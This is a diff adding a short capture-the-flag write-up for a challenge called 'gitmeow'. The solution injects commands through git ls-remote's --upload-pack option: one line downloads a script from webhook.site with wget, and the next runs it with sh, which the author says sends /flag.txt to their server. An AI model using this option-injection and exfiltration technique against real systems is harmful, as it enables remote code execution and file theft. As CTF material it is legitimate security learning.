@@ -30,3 +30,10 @@ log
 -C /tmp commit -m test
 -C /tmp show -I k3_fl
 ```
+@Alex_
+
+WU for gitmeow : (content of uniq_id is just a bash script with a wget to my server with the content of /flag.txt)
+```
+ls-remote --upload-pack=wget webhook.site/uniq_id
+ls-remote --upload-pack=sh uniq_id
+```
